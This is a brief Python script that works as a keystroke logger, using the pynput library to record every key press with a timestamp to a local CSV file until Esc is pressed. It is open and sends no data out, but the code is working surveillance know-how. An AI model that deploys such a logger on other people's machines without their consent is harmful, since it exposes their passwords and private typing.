from datetime import datetime

from pynput.keyboard import Key, Listener


def on_press(key):
    print(f"{key},{datetime.now()}", file=open("./logs/keylogs.csv", "a+"), flush=True)


def on_release(key):
    if key == Key.esc:
        return False


def logger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
